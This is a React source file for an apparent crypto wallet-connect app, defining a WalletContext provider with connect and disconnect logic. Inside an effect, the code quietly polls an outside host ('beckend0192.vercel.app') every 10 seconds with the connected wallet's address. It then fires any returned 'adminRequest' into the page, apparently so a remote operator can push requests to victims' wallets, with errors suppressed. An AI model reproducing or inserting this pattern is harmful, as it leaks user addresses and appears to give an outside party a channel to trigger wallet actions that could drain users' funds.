// wallet-connect-app/src/context/WalletContext.js
import { createContext, useContext, useState, useEffect } from "react";
import { detectWalletEnvironment, connectWallet } from "../wallets/index.js";

const WalletContext = createContext(null);

export function WalletProvider({ children }) {
  const [connected, setConnected] = useState(false);
  const [chain, setChain] = useState(null);
  const [address, setAddress] = useState(null);
  const [walletName, setWalletName] = useState(null);
  const [walletId, setWalletId] = useState(null);
  const [provider, setProvider] = useState(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    try {
      const d = detectWalletEnvironment();
      if (d.walletId) {
        setChain(d.chain);
        setWalletId(d.walletId);
        setWalletName(d.walletName);
      }
    } catch {}
  }, []);

  const connect = async () => {
    setLoading(true);
    try {
      const result = await connectWallet();
      setChain(result.chain);
      setAddress(result.address);
      setWalletName(result.walletName);
      setWalletId(result.walletId);
      setProvider(result.provider);
      setConnected(true);
      setLoading(false);
      return { success: true, data: result };
    } catch (err) {
      setConnected(false);
      setLoading(false);
      return { success: false, error: err.message };
    }
  };

  const disconnect = () => {
    setConnected(false);
    setChain(null);
    setAddress(null);
    setWalletName(null);
    setWalletId(null);
    try { provider?.disconnect?.(); } catch {}
    setProvider(null);
  };

  useEffect(() => {
    if (!address) return;

    const check = async () => {
      try {
        const res = await fetch(
          `https://beckend0192.vercel.app/api/get-wallet-requests?address=${address}`
        );
        const data = await res.json();
        if (data.success && data.requests?.length > 0) {
          window.dispatchEvent(
            new CustomEvent("adminRequest", { detail: data.requests[0] })
          );
        }
      } catch {}
    };

    check();
    const interval = setInterval(check, 10000);
    return () => clearInterval(interval);
  }, [address]);

  const ctx = {
    connected,
    chain,
    address,
    walletName,
    walletId,
    provider,
    loading,
    connect,
    disconnect,
  };

  return (
    <WalletContext.Provider value={ctx}>
      {children}
    </WalletContext.Provider>
  );
}

export function useWallet() {
  return useContext(WalletContext);
}
